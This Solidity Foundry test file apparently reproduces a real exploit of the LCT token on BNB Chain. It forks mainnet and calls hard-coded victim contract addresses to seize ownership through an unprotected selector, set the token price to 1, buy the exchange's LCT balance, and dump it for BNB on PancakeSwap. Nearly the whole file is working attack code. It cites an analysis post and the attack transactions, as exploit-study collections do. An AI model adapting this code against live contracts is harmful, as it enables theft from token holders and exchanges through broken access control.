// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://twitter.com/numencyber/status/1661213691893944320
// @TX
// https://explorer.phalcon.xyz/tx/bsc/0x57b589f631f8ff20e2a89a649c4ec2e35be72eaecf155fdfde981c0fec2be5ba
// https://explorer.phalcon.xyz/tx/bsc/0xbea605b238c85aabe5edc636219155d8c4879d6b05c48091cf1f7286bd4702ba
// https://explorer.phalcon.xyz/tx/bsc/0x49a3038622bf6dc3672b1b7366382a2c513d713e06cb7c91ebb8e256ee300dfb
// https://explorer.phalcon.xyz/tx/bsc/0x042b8dc879fa193acc79f55a02c08f276eaf1c4f7c66a33811fce2a4507cea63
// @Summary
// not open source; maybe inproper access control

interface LCTExchange {
    function buyTokens() external payable;
}

contract LCTExp is Test {
    address victim_proxy = 0x303554d4D8Bd01f18C6fA4A8df3FF57A96071a41;
    IPancakeRouter router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    LCTExchange exchange = LCTExchange(0xcE3e12bD77DD54E20a18cB1B94667F3E697bea06);
    IERC20 LCT = IERC20(0x5C65BAdf7F97345B7B92776b22255c973234EfE7);

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 28_460_897);
        deal(address(this), 1 ether);
    }

    function testExp() external {
        emit log_named_decimal_uint("[Start] Attacker BNB Balance", address(this).balance, 18);

        // Step1: get ownership
        bytes4 selector1 = 0xb5863c10;
        address temp = 0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE; // seems just some random meaningless address
        bytes memory data1 = new bytes(36);
        assembly {
            mstore(add(data1, 0x20), selector1)
            mstore(add(data1, 0x24), temp)
        }
        (bool success1,) = victim_proxy.call(data1);
        require(success1, "change ownership failed");

        // Step2: manipulate price
        bytes4 selector2 = 0x925d400c;
        uint256 new_price = 1;
        bytes memory data2 = new bytes(36);
        assembly {
            mstore(add(data2, 0x20), selector2)
            mstore(add(data2, 0x24), new_price)
        }
        (bool success2,) = victim_proxy.call(data2);
        require(success2, "manipulate price failed");

        // Step3: buy cheap LCT
        // emit log_named_decimal_uint("LCT Balance of Exchange", LCT.balanceOf(address(exchange)), 18);
        uint256 amount = LCT.balanceOf(address(exchange)) / 1e18;
        exchange.buyTokens{value: amount}();
        // emit log_named_decimal_uint("LCT Balance of contract", LCT.balanceOf(address(this)), 18);

        // Step4: swap cheap LCT to BNB in dex
        LCT.approve(address(router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(LCT);
        path[1] = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c; // WBNB
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            LCT.balanceOf(address(this)), 0, path, address(this), block.timestamp + 1000
        );

        emit log_named_decimal_uint("[End] Attacker BNB Balance", address(this).balance, 18);
    }

    receive() external payable {}
}
